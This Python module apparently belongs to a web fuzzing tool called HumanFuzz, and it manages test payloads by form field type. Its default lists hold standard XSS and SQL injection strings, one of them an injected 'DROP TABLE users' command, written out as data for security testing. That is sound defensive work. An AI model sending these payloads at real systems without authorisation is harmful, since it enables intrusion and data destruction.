"""
Payload generation and management module for HumanFuzz.
"""

from typing import Dict, List
import logging
import importlib
import pkgutil
import os

logger = logging.getLogger(__name__)

class Payload:
    """
    Represents a fuzzing payload.
    """

    def __init__(self, value: str, category: str, name: str, description: str = ""):
        """
        Initialize a payload.

        Args:
            value: The actual payload string
            category: Category of the payload (e.g., 'xss', 'sqli')
            name: Name of the payload
            description: Description of the payload
        """
        self.value = value
        self.category = category
        self.name = name
        self.description = description

    def __str__(self) -> str:
        return f"{self.name}: {self.value}"


class PayloadManager:
    """
    Manages payload generation and selection.
    """

    def __init__(self):
        """Initialize the payload manager."""
        self.payload_modules = {}
        self._load_payload_modules()

    def _load_payload_modules(self):
        """Dynamically load all payload modules."""
        logger.info("Loading payload modules")

        # Import all modules in the payloads package
        package_dir = os.path.dirname(__file__)
        for _, module_name, is_pkg in pkgutil.iter_modules([package_dir]):
            if not is_pkg and module_name != "__init__":
                try:
                    module = importlib.import_module(f"humanfuzz.payloads.{module_name}")
                    if hasattr(module, "get_payloads"):
                        self.payload_modules[module_name] = module
                        logger.debug(f"Loaded payload module: {module_name}")
                except ImportError as e:
                    logger.error(f"Error loading payload module {module_name}: {e}")

    def get_payloads_for_field(self, field: Dict) -> List[Payload]:
        """
        Get appropriate payloads for a specific field.

        Args:
            field: Field information dictionary

        Returns:
            List of Payload objects
        """
        field_type = field.get("type", "text")
        payloads = []

        # Get payloads from all modules
        for module_name, module in self.payload_modules.items():
            try:
                module_payloads = module.get_payloads(field_type)
                payloads.extend(module_payloads)
            except Exception as e:
                logger.error(f"Error getting payloads from module {module_name}: {e}")

        # If no payloads were found, use some defaults
        if not payloads:
            payloads = self._get_default_payloads(field_type)

        return payloads

    def _get_default_payloads(self, field_type: str) -> List[Payload]:
        """
        Get default payloads for a field type when no module provides them.

        Args:
            field_type: Type of the field

        Returns:
            List of Payload objects
        """
        if field_type in ["text", "search", "url", "tel", "email"]:
            return [
                Payload("test", "generic", "Basic Text"),
                Payload("<script>alert(1)</script>", "xss", "Basic XSS"),
                Payload("' OR '1'='1", "sqli", "Basic SQLi"),
                Payload("<img src=x onerror=alert(1)>", "xss", "Image XSS"),
                Payload("javascript:alert(1)", "xss", "JavaScript Protocol")
            ]
        elif field_type == "number":
            return [
                Payload("0", "generic", "Zero"),
                Payload("999999", "generic", "Large Number"),
                Payload("-1", "generic", "Negative Number"),
                Payload("1 OR 1=1", "sqli", "Numeric SQLi"),
                Payload("1; DROP TABLE users", "sqli", "Numeric Drop")
            ]
        elif field_type == "password":
            return [
                Payload("password123", "generic", "Common Password"),
                Payload("' OR '1'='1", "sqli", "SQLi in Password"),
                Payload("admin'--", "sqli", "Admin Bypass")
            ]
        elif field_type == "hidden":
            return [
                Payload("modified_value", "generic", "Modified Hidden"),
                Payload("' OR '1'='1", "sqli", "SQLi in Hidden"),
                Payload("<script>alert(1)</script>", "xss", "XSS in Hidden")
            ]
        elif field_type == "button" or field_type == "submit":
            return [
                Payload("<script>alert(1)</script>", "xss", "XSS in Button"),
                Payload("javascript:alert(1)", "xss", "JavaScript Protocol"),
                Payload("' OR '1'='1", "sqli", "SQLi in Button Value")
            ]
        else:
            return [Payload("test", "generic", "Default Test")]
